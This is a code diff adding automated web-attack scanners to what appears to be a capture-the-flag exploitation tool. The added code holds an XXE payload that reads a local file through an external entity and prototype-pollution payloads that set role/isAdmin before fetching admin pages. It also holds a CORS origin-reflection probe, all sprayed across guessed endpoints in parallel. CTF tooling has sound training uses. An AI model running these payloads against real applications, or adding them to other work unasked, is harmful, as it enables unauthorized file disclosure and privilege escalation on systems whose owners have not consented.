@@ -320,12 +320,98 @@ def scan_xpath_and_sqli(base):
     return findings, list(dict.fromkeys(flags))
 
 
+def scan_xxe(base, endpoints):
+    """Probe XML import/parser endpoints for external-entity expansion."""
+    candidates = []
+    for endpoint in endpoints:
+        path = urllib.parse.urlparse(endpoint).path.lower()
+        if any(word in path for word in ("xml", "import", "upload", "parse",
+                                         "convert", "feed", "document")):
+            candidates.append(endpoint.split("?", 1)[0])
+    candidates.extend(base + path for path in
+                     ("/api/xml", "/api/import", "/api/parse", "/upload",
+                      "/import", "/convert"))
+    payload = (b'<?xml version="1.0"?>'
+               b'<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "file:///flag">]>'
+               b'<root><value>&xxe;</value></root>')
+    findings, flags = [], []
+    for endpoint in list(dict.fromkeys(candidates))[:16]:
+        r = httpx.post(endpoint, data=payload,
+                       headers={"Content-Type": "application/xml",
+                                "Accept": "application/xml, application/json"},
+                       timeout=8)
+        got = _flags(r)
+        if got:
+            findings.append(f"  [!] XXE external entity expanded at {endpoint}")
+            flags.extend(got)
+            break
+    return findings, list(dict.fromkeys(flags))
+
+
+def scan_prototype_pollution(base, endpoints):
+    """Try common JSON prototype-pollution shapes against API endpoints.
+
+    The follow-up request is what turns a harmless reflection into a useful
+    CTF result: simple labs commonly gate /admin or /flag on role/isAdmin.
+    """
+    candidates = []
+    for endpoint in endpoints:
+        path = urllib.parse.urlparse(endpoint).path.lower()
+        if "/api/" in path or any(word in path for word in
+                                   ("profile", "settings", "message", "user")):
+            candidates.append(endpoint.split("?", 1)[0])
+    candidates.extend(base + path for path in
+                     ("/api/profile", "/api/settings", "/api/update",
+                      "/api/message", "/api/user", "/profile"))
+    marker = "ctf_auto_polluted"
+    payloads = (
+        {"__proto__": {"role": "admin", "isAdmin": True, marker: True}},
+        {"constructor": {"prototype": {"role": "admin", "isAdmin": True,
+                                          marker: True}}},
+    )
+    findings, flags = [], []
+    for endpoint in list(dict.fromkeys(candidates))[:12]:
+        for payload in payloads:
+            r = _post_json(endpoint, payload, timeout=8)
+            if r is None or r.status >= 500:
+                continue
+            _, got = _admin_gets(base)
+            if got:
+                findings.append(f"  [!] prototype pollution at {endpoint} reached admin data")
+                flags.extend(got)
+                return findings, list(dict.fromkeys(flags))
+    return findings, flags
+
+
+def scan_cors(base):
+    """Check reflected-origin CORS on common sensitive resources."""
+    findings, flags = [], []
+    origin = "https://ctf-auto.invalid"
+    for path in ("/flag", "/api/me", "/api/admin", "/admin"):
+        r = httpx.get(base + path, headers={"Origin": origin}, timeout=8)
+        if r is None:
+            continue
+        got = _flags(r)
+        if got:
+            findings.append(f"  [!] CORS-enabled sensitive endpoint {path} returned a flag")
+            flags.extend(got)
+        allow_origin = r.headers.get("access-control-allow-origin", "")
+        allow_creds = r.headers.get("access-control-allow-credentials", "").lower()
+        if allow_origin in (origin, "*"):
+            findings.append(f"  [!] CORS reflects {allow_origin} on {path}"
+                            + (" with credentials" if allow_creds == "true" else ""))
+    return findings, list(dict.fromkeys(flags))
+
+
 def scan_advanced(base, endpoints):
     """Run high-value multi-step web checks and return (findings, flags)."""
     jobs = (scan_jwt_attacks, scan_graphql_batches, lambda b, e: scan_internal_routes(b),
             lambda b, e: scan_common_idor_paths(b),
             lambda b, e: scan_race(b), lambda b, e: scan_archive_uploads(b),
-            lambda b, e: scan_xpath_and_sqli(b))
+            lambda b, e: scan_xpath_and_sqli(b),
+            lambda b, e: scan_xxe(b, e),
+            lambda b, e: scan_prototype_pollution(b, e),
+            lambda b, e: scan_cors(b))
     findings, flags = [], []
     with ThreadPoolExecutor(max_workers=len(jobs)) as pool:
         futures = [pool.submit(job, base, endpoints) for job in jobs]
